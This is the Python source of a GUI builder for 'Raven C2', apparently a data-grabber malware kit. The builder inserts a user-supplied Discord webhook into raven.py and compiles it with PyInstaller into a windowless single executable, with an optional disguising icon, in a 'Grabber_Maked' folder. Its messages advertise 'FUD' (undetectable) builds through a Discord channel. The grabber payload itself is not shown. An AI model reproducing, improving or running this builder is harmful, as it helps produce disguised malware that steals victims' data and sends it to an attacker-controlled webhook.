import os
import shutil
import threading
import customtkinter as ctk
from tkinter import messagebox, filedialog
from tkinter.ttk import Progressbar

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"Raven C2 ~ Free Version")
app.geometry("400x300")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    file_path = 'raven.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    def build():
        webhook = entry.get()

        if validate_webhook(webhook):
            replace_webhook(webhook)
            icon_choice = add_icon()

            if icon_choice:
                icon_path = select_icon()
                if not icon_path:
                    messagebox.showerror("Error", "No icon file selected.")
                    return
                else:
                    icon_option = f' --icon="{icon_path}"'
            else:
                icon_option = ''

            message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Discord channel - discord.gg/REjfyqnE5Y"
            messagebox.showinfo("Information", message)

            progress_bar["value"] = 0
            progress_bar.start(10)

            grabber_path = os.path.join(os.getcwd(), "Grabber_Maked")
            build_command = f'pyinstaller raven.py --noconsole --onefile{icon_option} --distpath="{grabber_path}"'
            os.system(build_command)

            progress_bar.stop()
            progress_bar["value"] = 100

            spec_file = os.path.join(os.getcwd(), "raven.spec")
            build_dir = os.path.join(os.getcwd(), "build")

            if os.path.exists(spec_file):
                os.remove(spec_file)

            if os.path.exists(build_dir):
                shutil.rmtree(build_dir)

            messagebox.showinfo("Build Success", "Build process completed successfully.\nDon't forget to star the repo and join Discord channel to support and receive lastest updates!")
        else:
            messagebox.showerror("Error", "Invalid webhook URL!")

    threading.Thread(target=build).start()


label = ctk.CTkLabel(master=app, text="Raven C2", text_color=("white"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)

progress_bar = Progressbar(master=app, orient="horizontal", mode="determinate", length=200)
progress_bar.place(relx=0.5, rely=0.75, anchor=ctk.CENTER)

app.mainloop()
